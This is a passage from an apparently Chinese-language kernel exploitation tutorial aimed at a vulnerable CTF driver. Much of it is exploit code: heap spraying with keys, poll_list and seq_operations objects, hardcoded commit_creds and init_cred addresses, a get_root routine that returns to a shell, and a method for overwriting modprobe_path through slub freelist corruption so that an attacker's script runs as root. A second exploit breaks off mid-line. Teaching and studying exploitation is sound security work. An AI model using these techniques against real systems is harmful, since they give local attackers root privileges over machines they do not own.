class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __aligned(x)                    __attribute__((__aligned__(x)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">int</span> payload_len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> description[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(description, <span class="string">&quot;pwn_%d&quot;</span>, id);</span><br><span class="line">    <span class="keyword">return</span> key_id[id] = syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, payload_len - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, key_id[id], payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *bufer, <span class="type">size_t</span> buflen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, key_id[id], bufer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, key_id[id], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, key_id[id], KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> tid[<span class="number">40</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nfds, timer;</span><br><span class="line">&#125; poll_args;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">alloc_poll_list</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> nfds = ((poll_args *) args)-&gt;nfds;</span><br><span class="line">    <span class="type">int</span> timer = ((poll_args *) args)-&gt;timer;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">pfds</span> =</span> <span class="built_in">calloc</span>(nfds, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nfds; i++) &#123;</span><br><span class="line">        pfds[i].fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">        pfds[i].events = POLLERR;</span><br><span class="line">    &#125;</span><br><span class="line">    poll(pfds, nfds, timer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">create_poll_list</span><span class="params">(<span class="type">size_t</span> size, <span class="type">int</span> timer, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    poll_args *args = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(poll_args));</span><br><span class="line">    args-&gt;nfds = (size - (size + PAGE_SIZE - <span class="number">1</span>) / PAGE_SIZE * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list)) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd) + N_STACK_PPS;</span><br><span class="line">    args-&gt;timer = timer;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;tid[i], <span class="literal">NULL</span>, alloc_poll_list, args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_file_private</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">tty</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_bufer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_bufer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *(*commit_creds)(<span class="type">void</span> *) = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF810A1340</span>;</span><br><span class="line"><span class="type">void</span> *init_cred = (<span class="type">void</span> *) <span class="number">0xFFFFFFFF81E496C0</span>;</span><br><span class="line"><span class="type">size_t</span> user_rip = (<span class="type">size_t</span>) get_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_offset;</span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov rax, [rsp + 8];&quot;</span></span><br><span class="line">        <span class="string">&quot;mov kernel_offset, rax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    kernel_offset -= <span class="number">0xffffffff81229378</span>;</span><br><span class="line">    commit_creds = (<span class="type">void</span> *) ((<span class="type">size_t</span>) commit_creds + kernel_offset);</span><br><span class="line">    init_cred = (<span class="type">void</span> *) ((<span class="type">size_t</span>) init_cred + kernel_offset);</span><br><span class="line">    commit_creds(init_cred);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push user_rip;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, (<span class="type">void</span> *) get_shell);</span><br><span class="line">    bof_fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="type">int</span> seq_fd[SEQ_NUM];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to alloc_kmalloc-4096\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span>* mem = <span class="built_in">malloc</span>(<span class="number">0x1010</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="string">&#x27;\xff&#x27;</span>, <span class="number">0x1010</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0x1000</span>, (<span class="type">char</span>*)mem, <span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to spary kmalloc-32\n&quot;</span>);</span><br><span class="line">    p.len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">20</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        <span class="built_in">memset</span>(mem, i, <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x18</span>);</span><br><span class="line">        ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">        ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to alloc_poll_list\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        create_poll_list(PAGE_SIZE + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> poll_list) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd), <span class="number">3000</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to spary kmalloc-32\n&quot;</span>);</span><br><span class="line">    p.len = <span class="number">0x20</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">20</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        <span class="built_in">memset</span>(mem, i, <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">memset</span>(mem, <span class="number">0</span>, <span class="number">0x18</span>);</span><br><span class="line">        ioctl(bof_fd, BOF_MALLOC, &amp;p);</span><br><span class="line">        ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    p.len = <span class="number">0x1001</span>;</span><br><span class="line">    p.idx = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">memset</span>(mem, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x1001</span>);</span><br><span class="line">    ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">14</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] wating for poll end\n&quot;</span>);</span><br><span class="line">        pthread_join(tid[i], &amp;res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        p.len = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">        ioctl(bof_fd, BOF_READ, &amp;p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;0] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;1] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;2] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;3] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">        mem[<span class="number">0</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        mem[<span class="number">1</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        mem[<span class="number">2</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        mem[<span class="number">3</span>] = (<span class="type">size_t</span>*)get_root;</span><br><span class="line">        ioctl(bof_fd, BOF_EDIT, &amp;p);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">40</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        p.idx = i;</span><br><span class="line">        p.len = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">        ioctl(bof_fd, BOF_READ, &amp;p);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;0] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;1] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;2] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[%d-&gt;3] p-&gt;buf == %p\n&quot;</span>, i, (<span class="type">size_t</span>*)mem[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        read(seq_fd[i], p.buf, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Arbitrary-Address-Allocation"><a href="#Arbitrary-Address-Allocation" class="headerlink" title="Arbitrary Address Allocation"></a>Arbitrary Address Allocation</h2><h3 id="利用思路-13"><a href="#利用思路-13" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过 uaf 修改 <code>object</code> 的 <code>free list</code> 指针实现任意地址分配。与 <code>glibc</code> 不同的是，内核的 <code>slub</code>  堆管理器缺少检查，因此对要分配的目标地址要求不高，不过有一点需要注意：当我们分配到目标地址时会把目标地址前 <code>8</code> 字节的数据会被写入  <code>freelist</code>，而这通常并非一个有效的地址，从而导致 <code>kernel panic</code>，因此在任意地址分配时最好确保目标 <code>object</code> 的 <code>free list</code> 字段为 <code>NULL</code> 。</p>
<p>当能够任意地址分配的时候，与 glibc 改 hook 类似，在内核中通常修改的是 <code>modprobe_path</code> 。<code>modprobe_path</code> 是内核中的一个变量，其值为 <code>/sbin/modprobe</code> ，因此对于缺少符号的内核文件可以通过搜索 <code>/sbin/modprobe</code> 字符串的方式定位这个变量。</p>
<p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">    sys_execve()</span><br><span class="line">        do_execve()</span><br><span class="line">            do_execveat_common()</span><br><span class="line">                bprm_execve()</span><br><span class="line">                    exec_binprm()</span><br><span class="line">                        search_binary_handler()</span><br><span class="line">                            __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                                call_modprobe()</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>call_modprobe()</code> 定义于 <code>kernel/kmod.c</code>，我们主要关注这部分代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>在这里调用了函数 <code>call_usermodehelper_exec()</code> 将 <code>modprobe_path</code> 作为可执行文件路径以 root 权限将其执行。<br>我们不难想到的是：若是我们能够劫持 <code>modprobe_path</code>，将其改写为我们指定的恶意脚本的路径，随后我们再执行一个非法文件，内核将会以 root 权限执行我们的恶意脚本。</p>
<p>或者分析<code>vmlinux</code>即可(对于一些没有<code>call_modprobe()</code>符号的直接交叉引用即可)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">__int64 _request_module(</span><br><span class="line">        <span class="type">char</span> a1,</span><br><span class="line">        __int64 a2,</span><br><span class="line">        <span class="type">double</span> a3,</span><br><span class="line">        <span class="type">double</span> a4,</span><br><span class="line">        <span class="type">double</span> a5,</span><br><span class="line">        <span class="type">double</span> a6,</span><br><span class="line">        <span class="type">double</span> a7,</span><br><span class="line">        <span class="type">double</span> a8,</span><br><span class="line">        <span class="type">double</span> a9,</span><br><span class="line">        <span class="type">double</span> a10,</span><br><span class="line">        ...)</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">......</span><br><span class="line">      v21 = call_usermodehelper_setup(</span><br><span class="line">              (__int64)&amp;byte_FFFFFFFF82444700, <span class="comment">// modprobe_path</span></span><br><span class="line">              (__int64)v18,</span><br><span class="line">              (__int64)&amp;off_FFFFFFFF82444620,</span><br><span class="line">              <span class="number">3264</span>,</span><br><span class="line">              <span class="number">0LL</span>,</span><br><span class="line">              (__int64)free_modprobe_argv,</span><br><span class="line">              <span class="number">0LL</span>);</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line">.data:FFFFFFFF82444700 byte_FFFFFFFF82444700             ; DATA XREF: __request_module:loc_FFFFFFFF8108C6D8↑r</span><br><span class="line">.data:FFFFFFFF82444700                 db <span class="number">2F</span>h  ; /       ; __request_module+<span class="number">14B</span>↑o ...                       </span><br><span class="line">.data:FFFFFFFF82444701                 db  <span class="number">73</span>h ; s</span><br><span class="line">.data:FFFFFFFF82444702                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF82444703                 db  <span class="number">69</span>h ; i</span><br><span class="line">.data:FFFFFFFF82444704                 db  <span class="number">6</span>Eh ; n</span><br><span class="line">.data:FFFFFFFF82444705                 db  <span class="number">2F</span>h ; /</span><br><span class="line">.data:FFFFFFFF82444706                 db  <span class="number">6</span>Dh ; m</span><br><span class="line">.data:FFFFFFFF82444707                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF82444708                 db  <span class="number">64</span>h ; d</span><br><span class="line">.data:FFFFFFFF82444709                 db  <span class="number">70</span>h ; p</span><br><span class="line">.data:FFFFFFFF8244470A                 db  <span class="number">72</span>h ; r</span><br><span class="line">.data:FFFFFFFF8244470B                 db  <span class="number">6F</span>h ; o</span><br><span class="line">.data:FFFFFFFF8244470C                 db  <span class="number">62</span>h ; b</span><br><span class="line">.data:FFFFFFFF8244470D                 db  <span class="number">65</span>h ; e</span><br><span class="line">.data:FFFFFFFF8244470E                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;src/pwn_helper.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_WRITE 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xFFFFFFFF81E48140</span>;</span><br><span class="line"><span class="type">size_t</span> seq_ops_start = <span class="number">0xffffffff81228d90</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">    <span class="type">size_t</span> *buf;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kmalloc len:%lu idx:%lld\n&quot;</span>, p-&gt;len, p-&gt;idx);</span><br><span class="line">    ioctl(fd, BOF_MALLOC, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_buf</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> param* p)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kfree 